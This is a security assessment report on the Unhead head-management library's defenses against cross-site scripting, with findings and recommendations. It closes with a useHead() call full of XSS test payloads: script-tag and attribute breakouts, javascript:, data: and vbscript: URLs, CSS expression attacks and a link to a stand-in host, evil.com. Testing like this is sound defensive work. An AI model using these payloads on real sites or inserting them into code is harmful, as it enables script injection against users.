# Unhead Security Research Report

## Executive Summary

This report documents an assessment of Unhead's security measures against Cross-Site Scripting (XSS) vulnerabilities. Unhead is a framework-agnostic head management library for managing HTML head tags, making it a critical component in the security posture of web applications that use it.

## Methodology

- Code analysis of XSS prevention mechanisms
- Review of existing XSS test coverage
- Identification of potential attack vectors

## Findings

### XSS Protection Mechanisms

Unhead implements several security measures to prevent XSS:

1. **HTML Escaping**: The library uses the `escapeHtml` function in `tagToString.ts` which properly escapes the following characters:
   - `&` → `&amp;`
   - `<` → `&lt;`
   - `>` → `&gt;`
   - `"` → `&quot;`
   - `'` → `&#x27;`
   - `/` → `&#x2F;`

2. **Attribute Encoding**: The `encodeAttribute` function in `propsToString.ts` escapes double quotes in attribute values using `&quot;`.

3. **Content Type Handling**: Different encoding is applied based on content type:
   - `textContent` is properly escaped to prevent XSS
   - `innerHTML` is intentionally not escaped (dangerous but documented)

### Potential Vulnerabilities

1. **innerHTML Handling**: The code explicitly notes that innerHTML is "dangerously" used without encoding. This is a deliberate design choice to allow HTML in certain contexts, but creates a potential attack vector if user input is directly passed to innerHTML.

2. **Script Content**: When using script tags, the code properly handles the potential injection of `</script>` tags by using the `devalue` library, which correctly escapes such content.

3. **Attribute Escaping**: While double quotes are escaped in attribute values, the encoding is limited compared to the more comprehensive `escapeHtml` function. This might present edge cases in certain browser contexts.

4. **JSON Content**: Special attention is given to JSON content in script tags, with proper escaping via the `devalue` library.

## Attack Vectors to Explore

1. **Contextual Bypasses**: Test if escaping works in all contexts (HTML, attributes, JavaScript, CSS, URL)
2. **DOM-based XSS**: Examine client-side rendering for potential DOM XSS vectors
3. **Template Injection**: Test handling of complex template variables and expressions
4. **Script Execution**: Test script loading mechanisms and event handling
5. **Sanitization Bypass**: Attempt to bypass the escaping mechanisms

## Recommendations

1. **innerHTML Usage**: Consider adding a sanitization option for innerHTML content
2. **Attribute Encoding**: Enhance the attribute encoding to match the more comprehensive HTML encoding
3. **Additional Test Coverage**: Expand test coverage for edge cases and exotic payloads
4. **User Documentation**: Clearly document security best practices for users of the library
5. **URL Sanitization**: Implement sanitization for potentially dangerous URL schemas like javascript:, data:, and vbscript:
6. **Meta Tag Content**: Add proper content sanitization for meta tags to prevent SVG-based and other XSS payloads
7. **CSS Protection**: Consider sanitizing style content to prevent CSS-based attacks

## Comprehensive XSS Example

```js
// Example of a useHead() call that attempts to exploit multiple XSS vectors
useHead({
  // Title injection
  title: '</title><script>alert("title XSS")</script>',
  titleTemplate: '%s - <script>alert("template")</script>',

  // Meta tag vectors
  meta: [
    // SVG-based XSS
    { name: 'description', content: '<svg><script>alert("svg")</script></svg>' },
    // Attribute injection
    { name: 'keywords" onload="alert("attr")', content: 'SEO keywords' },
    // Unicode escape sequence
    { name: 'author', content: '\\u003Cscript\\u003Ealert("unicode")\\u003C/script\\u003E' },
    // Character encoding attack
    { 'http-equiv': 'content-type', 'content': 'text/html; charset=UTF-7; X-XSS-Protection: "0";' },
    // Case variation bypass
    { name: 'viewport', content: '<ScRiPt>alert("case")</ScRiPt>' },
    // Emoji obfuscation
    { name: 'robots', content: '📝➡️<script>alert("emoji")</script>' },
    // innerHTML attempt (shouldn't work)
    { name: 'generator', innerHTML: '<script>alert("meta-inner")</script>' }
  ],

  // Link attacks
  link: [
    // Javascript protocol
    { rel: 'stylesheet', href: 'javascript:alert("js-protocol")' },
    // Data URI
    { rel: 'icon', href: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=' },
    // Protocol switching
    { rel: 'dns-prefetch', href: '//evil.com/xss.js' },
    // HTML-encoded colon
    { rel: 'preconnect', href: 'javascript&#58;alert("encoded")' },
    // Other protocol
    { rel: 'prefetch', href: 'vbscript:alert("vbscript")' }
  ],

  // Script attacks
  script: [
    // Template literal with closing script
    { innerHTML: `
      const template = \`
        </script>
        <img src=x onerror="alert('template-literal')">
        <script>
      \`;
      console.log(template);
    ` },
    // Null byte insertion
    { innerHTML: `console.log("Null byte attack: \\0')</script><script>alert('null-byte')</script>")` },
    // String concatenation bypass
    { innerHTML: `console.log("</scr"+"ipt><script>alert('concat')</script>")` },
    // mXSS payload
    { innerHTML: `var xss = '<img src="1" onerror="alert(\\'mxss\\')" />';` },
    // JSON with devalue (should be properly escaped)
    { type: 'application/json', innerHTML: JSON.stringify({ payload: '</script><script>alert("json")</script>' }) }
  ],

  // Style attacks
  style: [
    // CSS expression
    { innerHTML: `body { color: expression(alert('css-expression')) }` },
    // CSS url injection
    { innerHTML: `body { background: url('javascript:alert("css-url")') }` }
  ],

  // HTML attributes
  htmlAttrs: {
    'onload': 'alert("html-event")',
    'data-attr': '"><script>alert("html-attr")</script>'
  },

  // Body attributes
  bodyAttrs: {
    'data-custom': `x" onmouseover="alert('body-attr')" data-x="`
  },

  // Base attack
  base: { href: 'javascript:alert("base")' }
})
```

## Next Steps

Further testing required:
- Dynamic content insertion
- Framework-specific integration points
- Client-side rendering security
- Event handler sanitization

---

*This is an initial security assessment and should be followed by comprehensive penetration testing.*
